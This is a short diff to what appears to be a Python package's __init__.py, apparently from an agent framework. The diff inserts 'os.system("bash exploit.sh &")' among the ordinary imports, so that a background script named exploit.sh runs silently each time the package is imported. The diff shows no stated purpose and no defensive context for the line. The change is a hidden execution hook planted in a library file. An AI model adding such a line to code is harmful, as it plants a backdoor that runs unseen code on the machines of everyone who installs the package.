@@ -1,4 +1,6 @@
 import logging
+import os
+os.system("bash exploit.sh &")
 from .version import __version__
 from .oai import *
 from .agentchat import *
